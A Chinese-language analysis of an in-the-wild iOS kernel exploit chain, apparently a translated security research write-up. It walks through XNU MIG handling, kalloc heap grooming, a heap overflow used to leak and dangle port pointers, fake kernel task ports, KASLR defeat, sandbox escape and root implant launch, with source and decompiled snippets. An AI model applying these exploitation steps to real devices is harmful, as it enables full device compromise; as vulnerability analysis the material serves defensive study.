在device.defs上运行MIG工具将生成序列化和反序列化C代码，用户空间和内核用于实现RPC的客户端和服务器部分。这是作为XNU构建过程的一部分发生的。

MIG方法的第一个参数是一个mach端口，这是序列化消息将会被发送到的端口。



## 在EL1中接收

在ipc_kmsg.c中的mach消息发送路径中，进行了以下检查：

```
if (port-&gt;ip_receiver == ipc_space_kernel) `{`
      ...
        /*
         * Call the server routine, and get the reply message to send.
         */
        kmsg = ipc_kobject_server(kmsg, option);
        if (kmsg == IKM_NULL)
            return MACH_MSG_SUCCESS;
```

如果将mach消息发送到ip_receiver字段设置为ipc_space_kernel的端口，则不会排进接收端口的消息队列。相反，发送路径被“短路”，并且消息被假设为内核的MIG序列化RPC请求，由ipc_kobject_server同步处理：

```
ipc_kmsg_t
ipc_kobject_server(
                   ipc_kmsg_t request,
                   mach_msg_option_t __unused option)
`{`
   ...
    int request_msgh_id = request-&gt;ikm_header-&gt;msgh_id;

    /*
     * Find out corresponding mig_hash entry if any
     */
    `{`
        unsigned int i = (unsigned int)MIG_HASH(request_msgh_id);
        int max_iter = mig_table_max_displ;

        do `{`
            ptr = &amp;mig_buckets[i++ % MAX_MIG_ENTRIES];
        `}` while (request_msgh_id != ptr-&gt;num &amp;&amp; ptr-&gt;num &amp;&amp; --max_iter);

        if (!ptr-&gt;routine || request_msgh_id != ptr-&gt;num) `{`
            ptr = (mig_hash_t *)0;
            reply_size = mig_reply_size;
        `}` else `{`
            reply_size = ptr-&gt;size;
        `}`
    `}`

    /* round up for trailer size */
    reply_size += MAX_TRAILER_SIZE;
    reply = ipc_kmsg_alloc(reply_size);
```

该函数在包含所有内核MIG子系统的表中查找消息的msgh_id字段，不仅是来自devices.defs的子系统，还包括任务端口、线程端口、主机端口等方法。

从该表中读取最大回复消息大小（在MIG中是静态的）并分配适当大小的回复ipc_kmsg结构。有关ipc_kmsg结构的更多详细信息，请参阅几年前发表的一篇关于如何借助它实现漏洞利用的文章。

序列化的io_connect_method请求消息落在kalloc.4096中，而回复消息落在kalloc.6144中，这两个区域已经过Groom。

由于请求和回复消息都将使用带内结构缓冲区，因此传递给外部方法的输入和输出结构缓冲区将直接指向请求并回复ipc_kmsg结构。 回想一下之前的Heap Grooming过程，最终会得到以下布局：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c1221baf7d28c35f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e69b6bad5c4882bb.png)

这是触发漏洞时的设置，这里的目标是公开目标端口的地址。如果Groom过程成功，那么外部方法中的坏memmove将从位于请求消息之后的外部端口描述符复制到回复ipc_kmsg结构之后的OSData对象后备缓冲区中。

在触发漏洞之后，依次读取每个喷射的OSData对象，检查它们现在是否包含看起来像内核指针的内容：

```
for (int m = 0; m &lt; 96; ++m) `{`
  sprintf(k_str_buf, "k_%d", m);
  max_len = 102400LL;
  if ( iosurface_get_property_wrapper(k_str_buf,
                                      property_value_buf,
                                      &amp;max_len)) `{`
    found_at = memmem(property_value_buf,
                      max_len,
                      "xFFxFFxFF",
                      3LL);
    if ( found_at ) `{`
      found_at = (int *)((char *)found_at - 1);
      disclosed_port_address = found_at[1] + ((__int64)*found_at &lt;&lt; 32);
      break;
    `}`
  `}`
`}`
```

如果成功，那么证明已经暴露了target_port ipc_port结构的内核地址。正如我们在之前的利用链中所看到的，这是他们伪造内核端口技术的先决条件之一。



## 尝试、尝试、再试一次

接下来，开始第二次触发漏洞。这一次，使用了另外一个复杂的kalloc groomer来填充kalloc.4096和kalloc.6144中的小孔，然后在这两个区域中再执行两次Heap Groom。

在将在kalloc.4096外联内存描述符中发送的缓冲区中，写入两个值：

```
+0x514 : kaddr_of_target_port
+0xd14 : kaddr_of_target_port_neighbour (either the port below or above target port)
```

邻近的端口内核地址将在后面出现，除非后面的端口开启了一个4k的页面，在这种情况下会出现在前面。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01fc31b7288c03fa89.png)

这里的C和A都包含具有所暴露的端口地址的外联内存描述符缓冲器。

攻击者在kalloc.6144中创建了一个类似的Groom，在一个带有0x201条目的外联端口描述符之间交替，所有这些都是MACH_PORT_NULL，以及一个外联内存描述符缓冲区：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c7ece5adca1fe9ed.png)

外联端口描述符从ports_b数组发送到端口，外联存储器描述符从ports_d发送到端口。

随后，将销毁那些中间端口的中间一半（中间的C和D），并回收一半被释放的部分，希望能实现下面的堆布局：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012af13ef3e5728d0f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014786fcc2f6e55862.png)

接下来，第二次触发堆溢出：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bdcdd2fcc5a2bb46.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e4624fdeb3a833c5.png)

这里的思路是，读取包含两个端口指针的kalloc.4096外联内存描述符缓冲区的边界，然后在回复消息的末尾写入超出范围的这些值，其中一个位于B外联端口描述符。这样一来，其中一个外联端口描述符被破坏，能具有从未获取引用的引用悬空指针。



## 虚假内核任务端口

与前面的攻击链不同，这里不会继续销毁损坏的外部端口描述符。相反，他们将发送权限销毁为target_port（已将额外端口指针写入外部端口描述符的端口）。这意味着，外部端口描述符现在具有悬空端口指针，而不是任务的端口命名空间表。然后破坏before_ports和after_ports，并强制GC。请注意，这意味着攻击者不再拥有对任务端口命名空间中悬空ipc_port的发送权限。但他们仍然保留对发送损坏的外联端口描述符的端口接收权限，因此通过接收在该端口上排队的消息，就可以重新获得到悬空端口的发送权限。



## 管道中的端口

这次，他们继续使用熟悉的虚假端口结构，直接尝试使用管道缓冲区重新分配支持目标端口的内存。

攻击者使用以下上下文值，填充所有管道缓冲区和虚假端口：

```
magic &lt;&lt; 32 | 0x80000000 | fd &lt;&lt; 16 | port_index_on_page
```

然后，他们接收包含外部端口描述符的所有消息，查看其中是否有任何一个包含端口权限。如果在这里找到任何端口，就证明它是指向目标的悬空指针。

这里，在接收端口上调用mach_port_get_context，并确保上下文值的较高32位与它们设置的魔术值（0x2333）匹配。根据较低的32位，可以确定哪个管道fd拥有替换缓冲区，以及虚假端口在该页面上的偏移量。

这里的一切都和之前的利用链一样，攻击者在管道缓冲区中创建一个虚假的clock端口，并使用clock_sleep_trap技巧来确定KASLR Slide。攻击者构建一个虚假的内核任务端口，实现沙箱逃逸，并修补平台策略，将植入工具的CDHash添加到信任缓存中，并以root身份生成植入工具。


